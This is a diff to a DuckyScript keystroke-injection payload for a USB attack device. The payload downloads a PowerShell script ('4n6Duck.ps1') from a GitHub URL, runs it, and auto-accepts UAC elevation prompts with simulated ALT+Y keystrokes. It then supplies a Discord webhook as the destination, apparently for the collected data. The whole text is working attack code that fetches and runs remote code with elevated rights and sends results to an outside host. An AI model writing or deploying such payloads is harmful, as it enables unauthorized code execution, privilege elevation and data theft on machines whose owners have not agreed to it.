@@ -1,3 +1,4 @@
+REM update the webhook at the bottom
 REM Downloads files using PowerShell Invoke-WebRequest
 DELAY 500
 GUI r
@@ -7,6 +8,24 @@ ENTER
 DELAY 3000
 STRING iwr -Uri "https://raw.githubusercontent.com/K4INU/4n6-duck/refs/heads/main/4n6Duck.ps1" -OutFile "$env:PUBLIC\4n6Duck.ps1"
 ENTER
+Delay 600
+REM webhook command
+DELAY 2000
+STRING c:\users\PUBLIC\4n6Duck.ps1
+ENTER
+REM UAC 
 DELAY 1000
-STRING c:\users\PUBLIC\4n6Duck.ps1 -webhook 'https://discord.com/api/webhooks/{replace_me}'
+ALT y
+DELAY 500
+BACKSPACE
+DELAY 600
+ENTER
+REM UAC 
+DELAY 1000
+ALT y
+ENTER
+DELAY 1000
+REM update this webhook here! 
+STRING https://discord.com/api/webhooks/update_webhook_here
+DELAY 100
 ENTER
